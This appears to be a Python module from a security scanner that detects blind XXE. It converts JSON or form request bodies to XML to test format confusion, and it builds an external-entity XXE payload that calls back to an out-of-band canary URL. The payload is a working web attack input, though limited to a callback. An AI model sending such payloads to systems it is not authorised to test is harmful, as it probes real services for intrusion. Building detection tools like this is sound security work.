"""Blind XXE detection — format confusion + OAST callback confirmation.

Two lanes, both new relative to MoonMCP's existing injection probes:

* **Format confusion** — rewrites a JSON or form-urlencoded request body into an
  equivalent XML document and resends it with the ORIGINAL Content-Type header,
  porting Content Type Converter's core trick: some frameworks parse a request
  body by *sniffing its shape* rather than strictly enforcing the declared
  Content-Type, so a "JSON-only" endpoint may still hand the body to an XML
  parser. This lane alone proves nothing about XXE — it only tells you whether
  the OOB lane is worth trying on this endpoint.
* **Blind XXE via OAST** — once a body is accepted as XML (or on any endpoint
  that already declares XML), inject a `<!DOCTYPE>` external entity referencing
  a MoonMCP OAST canary and poll for a DNS/HTTP callback. A callback is
  unambiguous proof the parser dereferenced an external entity — no file is
  ever read and no data is exfiltrated (no out-of-band data channel is built),
  mirroring `ssrf_probe`/`fastjson_oast_probe`'s callback-only design.
"""

from __future__ import annotations

import json
import re
from urllib.parse import parse_qsl

_INVALID_TAG_CHARS = re.compile(r"[^A-Za-z0-9_.-]")


def _xml_escape(s: str) -> str:
    return (s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
            .replace('"', "&quot;").replace("'", "&apos;"))


def _sanitize_tag(name: str) -> str:
    tag = _INVALID_TAG_CHARS.sub("_", str(name)) or "field"
    if not (tag[0].isalpha() or tag[0] == "_"):
        tag = "_" + tag
    return tag


def _to_xml_value(name: str, value: object) -> str:
    """Render one field as a nested XML element (pure, recursive for dict/list)."""

    tag = _sanitize_tag(name)
    if isinstance(value, dict):
        inner = "".join(_to_xml_value(k, v) for k, v in value.items())
        return f"<{tag}>{inner}</{tag}>"
    if isinstance(value, list):
        return "".join(_to_xml_value(tag, v) for v in value)
    if value is None:
        return f"<{tag}/>"
    return f"<{tag}>{_xml_escape(str(value))}</{tag}>"


def json_to_xml(body: str, root: str = "root") -> str | None:
    """Rewrite a JSON *object* body into an equivalent XML document (pure). Returns
    None if `body` isn't a JSON object — a top-level array/scalar doesn't map onto
    named XML fields cleanly."""

    try:
        data = json.loads(body)
    except (ValueError, TypeError):
        return None
    if not isinstance(data, dict):
        return None
    inner = "".join(_to_xml_value(k, v) for k, v in data.items())
    return f'<?xml version="1.0"?><{root}>{inner}</{root}>'


def form_to_xml(body: str, root: str = "root") -> str | None:
    """Rewrite an `application/x-www-form-urlencoded` body into an equivalent XML
    document (pure). Returns None for an empty/unparseable body."""

    pairs = parse_qsl(body, keep_blank_values=True)
    if not pairs:
        return None
    inner = "".join(_to_xml_value(k, v) for k, v in pairs)
    return f'<?xml version="1.0"?><{root}>{inner}</{root}>'


def xxe_oob_payload(canary_url: str, root: str = "root") -> str:
    """A blind-XXE document: a DOCTYPE external entity resolving to *canary_url*,
    referenced from the document body so a non-validating parser still resolves
    it. Sole effect is one outbound HTTP/DNS request to the canary — no file is
    read, no data is exfiltrated."""

    return (f'<?xml version="1.0"?>'
           f'<!DOCTYPE {root} [<!ENTITY xxe SYSTEM "{canary_url}">]>'
           f'<{root}>&xxe;</{root}>')
